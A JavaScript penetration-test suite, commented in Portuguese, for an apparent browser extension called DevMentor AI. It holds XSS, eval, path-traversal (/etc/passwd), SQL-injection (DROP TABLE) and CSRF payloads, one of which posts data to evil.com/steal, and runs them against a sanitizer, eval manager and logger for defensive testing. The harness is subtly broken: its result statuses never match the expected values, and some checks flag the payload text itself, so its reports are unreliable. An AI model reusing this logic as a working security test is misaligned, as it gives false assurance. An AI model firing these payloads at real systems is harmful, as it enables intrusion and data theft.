/**
 * DevMentor AI - Testes de Penetração
 * Suite de testes para validar a segurança do sistema
 * Implementação baseada nas recomendações de auditoria
 */

class PenetrationTestSuite {
  constructor() {
    this.logger = (typeof __DEVMENTOR_LOGGER !== 'undefined') ? __DEVMENTOR_LOGGER : console;
    this.results = [];
    this.vulnerabilities = [];
    this.testCases = this.getTestCases();
  }

  getTestCases() {
    return {
      // Testes de XSS
      xss: [
        {
          name: 'Script Injection via innerHTML',
          payload: '<script>alert("XSS")</script>',
          expected: 'blocked',
          severity: 'high'
        },
        {
          name: 'Event Handler Injection',
          payload: '<div onclick="alert(1)">Click me</div>',
          expected: 'sanitized',
          severity: 'high'
        },
        {
          name: 'JavaScript URL',
          payload: '<a href="javascript:alert(1)">Link</a>',
          expected: 'sanitized',
          severity: 'medium'
        },
        {
          name: 'Iframe Injection',
          payload: '<iframe src="javascript:alert(1)"></iframe>',
          expected: 'blocked',
          severity: 'high'
        }
      ],

      // Testes de execução de código
      codeExecution: [
        {
          name: 'Direct eval() call',
          payload: 'eval("alert(1)")',
          expected: 'blocked',
          severity: 'critical'
        },
        {
          name: 'Function constructor',
          payload: 'new Function("alert(1)")()',
          expected: 'blocked',
          severity: 'critical'
        },
        {
          name: 'setTimeout with string',
          payload: 'setTimeout("alert(1)", 100)',
          expected: 'blocked',
          severity: 'high'
        },
        {
          name: 'setInterval with string',
          payload: 'setInterval("alert(1)", 100)',
          expected: 'blocked',
          severity: 'high'
        }
      ],

      // Testes de path traversal
      pathTraversal: [
        {
          name: 'Basic path traversal',
          payload: '../../../etc/passwd',
          expected: 'blocked',
          severity: 'high'
        },
        {
          name: 'URL encoded path traversal',
          payload: '..%2f..%2f..%2fetc%2fpasswd',
          expected: 'blocked',
          severity: 'high'
        },
        {
          name: 'Double encoded path traversal',
          payload: '..%252f..%252f..%252fetc%252fpasswd',
          expected: 'blocked',
          severity: 'high'
        }
      ],

      // Testes de injeção SQL (se aplicável)
      sqlInjection: [
        {
          name: 'Basic SQL injection',
          payload: "'; DROP TABLE users; --",
          expected: 'sanitized',
          severity: 'critical'
        },
        {
          name: 'Union-based injection',
          payload: "' UNION SELECT * FROM users --",
          expected: 'sanitized',
          severity: 'critical'
        },
        {
          name: 'Boolean-based injection',
          payload: "' OR 1=1 --",
          expected: 'sanitized',
          severity: 'high'
        }
      ],

      // Testes de CSRF
      csrf: [
        {
          name: 'Cross-site request forgery',
          payload: '<form action="http://evil.com/steal" method="POST"><input type="hidden" name="data" value="stolen"></form>',
          expected: 'blocked',
          severity: 'medium'
        }
      ],

      // Testes de dados sensíveis
      sensitiveData: [
        {
          name: 'API key exposure',
          payload: 'api_key: sk-1234567890abcdef',
          expected: 'redacted',
          severity: 'high'
        },
        {
          name: 'Password exposure',
          payload: 'password: secret123',
          expected: 'redacted',
          severity: 'high'
        },
        {
          name: 'Token exposure',
          payload: 'token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...',
          expected: 'redacted',
          severity: 'high'
        }
      ]
    };
  }

  async runAllTests() {
    this.logger.info('[PenetrationTestSuite] Starting penetration tests');
    
    const startTime = Date.now();
    
    for (const [category, tests] of Object.entries(this.testCases)) {
      this.logger.info(`[PenetrationTestSuite] Running ${category} tests`);
      
      for (const test of tests) {
        await this.runTest(category, test);
      }
    }
    
    const duration = Date.now() - startTime;
    this.generateReport(duration);
    
    this.logger.info('[PenetrationTestSuite] Penetration tests completed');
    return this.results;
  }

  async runTest(category, test) {
    const testResult = {
      category,
      name: test.name,
      payload: test.payload,
      expected: test.expected,
      severity: test.severity,
      timestamp: Date.now(),
      status: 'running'
    };

    try {
      let result;
      
      switch (category) {
        case 'xss':
          result = await this.testXSS(test.payload);
          break;
        case 'codeExecution':
          result = await this.testCodeExecution(test.payload);
          break;
        case 'pathTraversal':
          result = await this.testPathTraversal(test.payload);
          break;
        case 'sqlInjection':
          result = await this.testSQLInjection(test.payload);
          break;
        case 'csrf':
          result = await this.testCSRF(test.payload);
          break;
        case 'sensitiveData':
          result = await this.testSensitiveData(test.payload);
          break;
        default:
          result = { status: 'skipped', reason: 'Unknown test category' };
      }

      testResult.result = result;
      testResult.status = this.evaluateResult(result, test.expected);
      
      if (testResult.status === 'failed') {
        this.vulnerabilities.push({
          ...testResult,
          severity: test.severity
        });
      }

    } catch (error) {
      testResult.result = { status: 'error', error: error.message };
      testResult.status = 'error';
    }

    this.results.push(testResult);
    this.logger.debug(`[PenetrationTestSuite] Test ${test.name}: ${testResult.status}`);
  }

  async testXSS(payload) {
    try {
      // Testar sanitização HTML
      if (typeof __DEVMENTOR_SANITIZE !== 'undefined') {
        const sanitized = __DEVMENTOR_SANITIZE.sanitize(payload);
        
        // Verificar se script foi removido
        const hasScript = /<script[^>]*>.*?<\/script>/gi.test(sanitized);
        const hasOnClick = /onclick\s*=/gi.test(sanitized);
        const hasJavaScript = /javascript:/gi.test(sanitized);
        
        return {
          status: hasScript || hasOnClick || hasJavaScript ? 'vulnerable' : 'secure',
          sanitized,
          hasScript,
          hasOnClick,
          hasJavaScript
        };
      } else {
        return { status: 'error', error: 'HTML sanitizer not available' };
      }
    } catch (error) {
      return { status: 'error', error: error.message };
    }
  }

  async testCodeExecution(payload) {
    try {
      // Testar EvalManager
      if (typeof __DEVMENTOR_EVAL_MANAGER !== 'undefined') {
        try {
          const result = __DEVMENTOR_EVAL_MANAGER.safeEval(payload, {});
          return {
            status: 'vulnerable',
            result,
            message: 'Dangerous code execution allowed'
          };
        } catch (error) {
          return {
            status: 'secure',
            error: error.message,
            message: 'Dangerous code execution blocked'
          };
        }
      } else {
        return { status: 'error', error: 'EvalManager not available' };
      }
    } catch (error) {
      return { status: 'error', error: error.message };
    }
  }

  async testPathTraversal(payload) {
    try {
      // Simular validação de path
      const hasPathTraversal = /\.\.\//gi.test(payload) || /\.\.\\/gi.test(payload);
      
      if (hasPathTraversal) {
        return {
          status: 'vulnerable',
          message: 'Path traversal pattern detected'
        };
      } else {
        return {
          status: 'secure',
          message: 'No path traversal patterns detected'
        };
      }
    } catch (error) {
      return { status: 'error', error: error.message };
    }
  }

  async testSQLInjection(payload) {
    try {
      // Simular validação de SQL injection
      const sqlPatterns = [
        /drop\s+table/gi,
        /union\s+select/gi,
        /or\s+1\s*=\s*1/gi,
        /';/gi,
        /--/gi
      ];
      
      const hasSQLInjection = sqlPatterns.some(pattern => pattern.test(payload));
      
      if (hasSQLInjection) {
        return {
          status: 'vulnerable',
          message: 'SQL injection pattern detected'
        };
      } else {
        return {
          status: 'secure',
          message: 'No SQL injection patterns detected'
        };
      }
    } catch (error) {
      return { status: 'error', error: error.message };
    }
  }

  async testCSRF(payload) {
    try {
      // Verificar se há formulários maliciosos
      const hasMaliciousForm = /<form[^>]*action\s*=\s*["'][^"']*evil[^"']*["']/gi.test(payload);
      
      if (hasMaliciousForm) {
        return {
          status: 'vulnerable',
          message: 'Malicious form detected'
        };
      } else {
        return {
          status: 'secure',
          message: 'No malicious forms detected'
        };
      }
    } catch (error) {
      return { status: 'error', error: error.message };
    }
  }

  async testSensitiveData(payload) {
    try {
      // Testar redaction de logs
      if (typeof __DEVMENTOR_LOGGER !== 'undefined') {
        // Simular log com dados sensíveis
        const originalLog = __DEVMENTOR_LOGGER.debug;
        let loggedData = null;
        
        __DEVMENTOR_LOGGER.debug = (message) => {
          loggedData = message;
        };
        
        __DEVMENTOR_LOGGER.debug(payload);
        
        // Restaurar logger original
        __DEVMENTOR_LOGGER.debug = originalLog;
        
        // Verificar se dados foram redacted
        const hasRedactedData = loggedData && loggedData.includes('[REDACTED]');
        
        return {
          status: hasRedactedData ? 'secure' : 'vulnerable',
          loggedData,
          hasRedactedData,
          message: hasRedactedData ? 'Data properly redacted' : 'Data not redacted'
        };
      } else {
        return { status: 'error', error: 'Logger not available' };
      }
    } catch (error) {
      return { status: 'error', error: error.message };
    }
  }

  evaluateResult(result, expected) {
    if (result.status === 'error') {
      return 'error';
    }
    
    if (result.status === expected) {
      return 'passed';
    } else {
      return 'failed';
    }
  }

  generateReport(duration) {
    const report = {
      timestamp: Date.now(),
      duration,
      summary: {
        totalTests: this.results.length,
        passed: this.results.filter(r => r.status === 'passed').length,
        failed: this.results.filter(r => r.status === 'failed').length,
        errors: this.results.filter(r => r.status === 'error').length,
        vulnerabilities: this.vulnerabilities.length
      },
      vulnerabilities: this.vulnerabilities,
      results: this.results,
      recommendations: this.generateRecommendations()
    };

    this.logger.info('[PenetrationTestSuite] Test report generated:', report.summary);
    
    // Salvar relatório
    this.saveReport(report);
    
    return report;
  }

  generateRecommendations() {
    const recommendations = [];
    
    // Analisar vulnerabilidades por categoria
    const vulnerabilitiesByCategory = this.vulnerabilities.reduce((acc, vuln) => {
      acc[vuln.category] = (acc[vuln.category] || 0) + 1;
      return acc;
    }, {});
    
    // Gerar recomendações baseadas nas vulnerabilidades
    if (vulnerabilitiesByCategory.xss > 0) {
      recommendations.push({
        priority: 'high',
        category: 'XSS',
        message: 'Implementar sanitização HTML mais rigorosa',
        action: 'Review HTML sanitizer configuration'
      });
    }
    
    if (vulnerabilitiesByCategory.codeExecution > 0) {
      recommendations.push({
        priority: 'critical',
        category: 'Code Execution',
        message: 'Bloquear completamente eval() e new Function()',
        action: 'Implementar EvalManager mais restritivo'
      });
    }
    
    if (vulnerabilitiesByCategory.pathTraversal > 0) {
      recommendations.push({
        priority: 'high',
        category: 'Path Traversal',
        message: 'Implementar validação de paths mais rigorosa',
        action: 'Review file access validation'
      });
    }
    
    if (vulnerabilitiesByCategory.sensitiveData > 0) {
      recommendations.push({
        priority: 'high',
        category: 'Data Exposure',
        message: 'Melhorar redaction de dados sensíveis',
        action: 'Review logger redaction patterns'
      });
    }
    
    return recommendations;
  }

  saveReport(report) {
    // Salvar relatório em storage local
    if (typeof chrome !== 'undefined' && chrome.storage) {
      chrome.storage.local.set({
        penetrationTestReport: report
      });
    }
    
    // Log do relatório
    this.logger.info('[PenetrationTestSuite] Report saved');
  }

  // Métodos utilitários
  getVulnerabilityCount() {
    return this.vulnerabilities.length;
  }

  getCriticalVulnerabilities() {
    return this.vulnerabilities.filter(v => v.severity === 'critical');
  }

  getHighVulnerabilities() {
    return this.vulnerabilities.filter(v => v.severity === 'high');
  }

  getTestResults() {
    return this.results;
  }

  // Método para executar teste específico
  async runSpecificTest(category, testName) {
    const tests = this.testCases[category];
    if (!tests) {
      throw new Error(`Unknown test category: ${category}`);
    }
    
    const test = tests.find(t => t.name === testName);
    if (!test) {
      throw new Error(`Unknown test: ${testName}`);
    }
    
    await this.runTest(category, test);
    return this.results[this.results.length - 1];
  }
}

// Exportar para uso global
if (typeof window !== 'undefined') {
  window.PenetrationTestSuite = PenetrationTestSuite;
}

if (typeof module !== 'undefined' && module.exports) {
  module.exports = PenetrationTestSuite;
}


